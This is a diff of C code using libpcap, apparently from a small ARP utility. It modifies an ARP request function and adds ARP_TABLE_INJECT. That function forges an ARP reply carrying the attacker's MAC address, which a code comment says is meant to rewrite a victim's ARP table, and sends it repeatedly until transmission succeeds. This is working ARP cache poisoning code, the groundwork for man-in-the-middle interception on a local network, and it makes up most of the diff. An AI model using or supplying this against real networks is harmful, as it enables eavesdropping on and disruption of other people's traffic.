@@ -71,7 +71,7 @@ void GET_MYIP(u_int8_t *ip_addr, char *interface) {
 
 }
 
-void ARP_REQUEST(pcap_t *handle, u_char *mac_addr, struct in_addr *senderIP, struct in_addr *targetIP) {
+u_char* ARP_REQUEST(pcap_t *handle, u_char *mac_addr, struct in_addr *senderIP, struct in_addr *targetIP) {
 	u_char* packet;
 	u_char* recv_packet;
     struct ether_header etherHdr, *recv_ether; // <netinet/ether.h>
@@ -81,7 +81,7 @@ void ARP_REQUEST(pcap_t *handle, u_char *mac_addr, struct in_addr *senderIP, str
 	int packet_len;
 	int flag, i;
 	struct in_addr recv_IP;
-	u_char* recv_MAC;
+
 	u_char* buf;
 	u_char addr[4];
 	
@@ -127,7 +127,7 @@ void ARP_REQUEST(pcap_t *handle, u_char *mac_addr, struct in_addr *senderIP, str
 		if(flag == 0) {
 			printf("[-] time out\n");
 			if(pcap_sendpacket(handle,packet,packet_len) !=0){
-				printf("[-] failed... restart the program!\n");
+				printf("[-] failed! exit!\n");
 				exit(1);
 			}
 			else
@@ -176,13 +176,58 @@ void ARP_REQUEST(pcap_t *handle, u_char *mac_addr, struct in_addr *senderIP, str
     	    printf("%02x:", recv_arp->sender_mac[i]);
       	}
       	printf("%02x\n",recv_arp->sender_mac[5]);
-
+		return recv_arp->sender_mac;
 	}
 
 }
+void ARP_TABLE_INJECT(pcap_t *handle, u_char *my_mac, u_char *sender_mac, struct in_addr *senderIP, struct in_addr *targetIP) {
+	u_char* packet;
+	struct ether_header etherHdr; //recv is not needed!!
+	struct arp_hdr_ arp_h;
+	struct pcap_pkthdr *header;
+	int packet_len;
+	int flag;
+	struct in_addr recv_IP;
 
-void arp_table_inject(pcap_t *handle, u_char *my_mac, u_char *sender_mac, struct in_addr *senderIP, struct in_addr *targetIP) {
+	u_char* buf;
+	u_char addr[4];
+	int i;
 	
+	//ether layer
+	memcpy(etherHdr.ether_shost,my_mac,ETHER_ADDR_LEN);
+	memcpy(etherHdr.ether_dhost,sender_mac,ETHER_ADDR_LEN);
+	etherHdr.ether_type = htons(0x0806); // short! ARP 0x0806
 
+	// arp layer
+	arp_h.htype = htons(0x0001);
+	arp_h.ptype = htons(ETHERTYPE_IP);
+	arp_h.hlen = ETHER_ADDR_LEN;
+	arp_h.plen = 4;
+	arp_h.opcode = htons(2); // sending reply and rearrange victim's arp table
+
+	memcpy(arp_h.sender_mac,my_mac,sizeof(arp_h.sender_mac));
+	memcpy(arp_h.sender_ip,senderIP,sizeof(arp_h.sender_ip));
+	memcpy(arp_h.target_mac,"\x00\x00\x00\x00\x00\x00",sizeof(arp_h.target_mac));
+	memcpy(arp_h.target_ip,targetIP,sizeof(arp_h.target_ip));
+
+	// packet arrangement!
+	packet = (u_char*) malloc(sizeof(etherHdr)+sizeof(arp_h));
+	memcpy(packet, &etherHdr, sizeof(etherHdr));
+	memcpy(packet + sizeof(etherHdr), &arp_h, sizeof(arp_h));
+	packet_len = sizeof(etherHdr) + sizeof(arp_h);
+
+	printf("\n[+] packet to send\n");
+	for(int i=0;i<sizeof(etherHdr)+sizeof(arp_h);i++){
+		if(i != 0 && i % 16 == 0)
+			printf("\n");
+		printf("%02x ",*(packet+i));
+	}
+
+
+	while(1) {
+	if(pcap_sendpacket(handle,packet,packet_len) == 0)
+		break;
+	}
+	printf("\n[+] arp request completed!\n\n");
 
 }
